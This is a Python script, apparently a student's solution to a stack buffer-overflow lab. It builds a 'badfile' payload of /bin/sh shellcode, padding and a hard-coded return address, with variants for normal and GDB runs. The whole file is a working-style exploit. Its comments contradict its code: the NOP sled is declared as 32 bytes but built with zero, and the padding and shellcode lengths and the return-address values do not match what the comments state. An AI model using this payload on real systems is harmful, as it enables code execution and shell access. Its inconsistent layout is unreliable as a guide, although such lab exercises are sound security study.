#!/usr/bin/env python3

import sys

# Check if gdb mode is requested
gdb_mode = len(sys.argv) > 1 and sys.argv[1] == "--gdb"

# Exploit buffer construction
# Buffer layout:
# [NOP sled (32)] + [Shellcode (25)] + [Padding (53)] + [Return address (4)]
# Total: 114 bytes (110 bytes payload + 4 bytes return address)

# 1. NOP sled (32 bytes)
nop_sled = b"\x90" * 0

# 2. Shellcode to spawn /bin/sh (25 bytes)
shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    b"\x53\x89\xe1\x31\xd2\x31\xc0\xb0"
    b"\x0b\xcd\x80"
)

# 3. Padding to reach the saved return address (53 bytes)
# Empirically: 110 bytes before return address works
# 110 - (32 + 25) = 53
padding = b"A" * 86

# 4. Return address pointing into the NOP sled (little endian)
# With ASLR disabled and 112-byte offset:
# - Normal execution: buffer at 0xffffc8bc → target 0xffffc8b0 works
# - GDB execution: buffer at 0xffffc84c → target 0xffffc85c (middle of NOP sled)

if gdb_mode:
    #ret_addr = b"\x5c\xc8\xff\xff"  # For gdb: 0xffffc85c
    ret_addr = b"\x9c\xcc\x8a\xff"  # For gdb: 0xffff8acc    
    print("Mode: GDB", file=sys.stderr)
else:
    ret_addr = b"\xcc\xc8\xff\xff"  # For normal: 0xffffc8b0
    print("Mode: Normal execution", file=sys.stderr)


# Construct final exploit buffer
exploit = nop_sled + shellcode + padding + ret_addr


# Write the exploit buffer to 'badfile' as raw bytes
with open('badfile', 'wb') as f:
    f.write(exploit)
